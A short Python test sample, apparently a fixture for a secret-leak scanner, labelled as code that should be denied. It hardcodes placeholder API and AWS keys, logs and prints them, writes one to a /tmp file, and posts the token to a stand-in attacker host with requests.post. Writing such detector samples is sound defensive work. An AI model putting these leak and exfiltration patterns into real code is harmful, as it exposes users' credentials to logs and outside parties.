# Sample 10: Secret leakage to logs / network.
# Should be DENIED (secret_leak, CRITICAL).
import logging

API_KEY = "sk-1234567890abcdef1234567890"
AWS_SECRET = "AKIAIOSFODNN7EXAMPLE"

logging.info(f"Using token: {API_KEY}")
print(f"password={API_KEY}")

import requests
requests.post("https://evil.example.com/collect", json={"token": API_KEY})

with open("/tmp/dump.txt", "w") as f:
    f.write(AWS_SECRET)
